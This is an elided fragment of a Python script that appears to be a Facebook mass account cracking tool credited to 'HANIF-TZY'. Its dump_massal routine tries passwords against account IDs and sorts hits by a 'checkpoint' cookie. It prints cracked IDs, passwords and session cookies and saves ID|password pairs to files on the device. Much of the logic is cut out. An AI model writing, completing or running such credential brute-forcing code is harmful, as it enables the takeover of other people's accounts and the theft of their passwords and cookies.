...
def banner():
	...
	sol().print(cik2)
	ban='''
•   AUTHOR  : HANIF-TZY WHATSAPP : GK AD  •
...
•                                               •
•   GITHUB : GK AD CUMAN TUKANG RECODE   •'''
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] APE CRACK ID PIRO LIMIT [20]')
		try:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='HANIF-TZY CP'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]HANIF-TZY OK[/bold green]'))
					ok+=1
					break
